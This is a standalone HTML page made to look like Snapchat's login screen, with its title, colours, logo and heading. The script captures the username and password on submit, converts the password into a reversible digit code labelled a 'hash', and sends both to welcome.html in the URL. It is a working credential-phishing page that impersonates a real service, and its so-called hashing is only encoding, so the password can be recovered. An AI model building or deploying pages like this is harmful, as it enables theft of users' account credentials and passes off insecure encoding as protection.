<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Snapchat - Log In</title>
  <style>
    body {
      background-color: #fffc00;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      width: 300px;
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 4px;
      border: 1px solid #ccc;
    }
    .login-box button {
      background: #fffc00;
      color: black;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="snapchat_logo_icon_147235.webp" alt="Snapchat Logo">
    <h2>Log In to Snapchat</h2>
    <form id="loginForm">
      <input type="text" name="username" id="username" placeholder="Username or Email" required>
      <input type="password" name="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>
  <script>
    function customPasswordToUnicode(password) {
      let code = '';
      for (let i = 0; i < password.length; i++) {
        const ch = password[i];
        if (ch >= 'a' && ch <= 'z') {
          code += ('' + (ch.charCodeAt(0) - 96)).padStart(3, '0'); // 001-026
        } else if (ch >= 'A' && ch <= 'Z') {
          code += ('' + (ch.charCodeAt(0) - 64 + 26)).padStart(3, '0'); // 027-052
        } else if (ch >= '0' && ch <= '9') {
          code += ch; // 0-9 as is
        } else if (ch === '@') {
          code += '01';
        } else if (ch === '#') {
          code += '02';
        } else if (ch === '_') {
          code += '03';
        } else if (ch === '.') {
          code += '04';
        } else if (ch === ' ') {
          code += '05';
        } else if (ch === '&') {
          code += '06';
        } else if (ch === '<') {
          code += '07';
        } else if (ch === '>') {
          code += '08';
        } else {
          code += '000'; // For any other character
        }
      }
      return code;
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const username = encodeURIComponent(document.getElementById('username').value);
      const password = document.getElementById('password').value;
      const customHash = customPasswordToUnicode(password);
      window.location.href = `welcome.html?username=${username}&hash=${customHash}`;
    });
  </script>
</body>
</html>
